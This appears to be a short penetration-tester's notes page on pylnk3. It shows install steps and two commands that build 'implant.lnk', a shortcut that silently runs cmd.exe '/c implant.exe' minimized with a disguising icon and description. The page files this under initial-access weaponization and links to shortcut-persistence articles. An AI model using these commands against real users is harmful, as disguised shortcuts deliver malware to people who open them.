# Unix Shell

## 01 - Setup

### 1.1 - Package Manager

```
$ yay -S python-pylnk3
```

### 1.2 - Universal Install

```
$ git clone https://github.com/strayge/pylnk.git
```

TODO: Fill in the information

## 02 - Usage

```
$ pylnk3 c C:\Windows\System32\cmd.exe implant.lnk -a "/c implant.exe" -ii <index_number> -m Minimized -d "<description>"
```

```
$ pylnk3 c C:\Windows\System32\cmd.exe implant.lnk -a "/c implant.exe" -i /path/to/file.ext -m Minimized -d "<description>"
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut Link File/Windows/Manual/Living off the Land]]

### Source Repositories

- [strayge: pylnk](https://github.com/strayge/pylnk)

### Pentestlab

- [Pentestlab Blog: Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)

### Hacking Articles

- [Hacking Articles: Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/)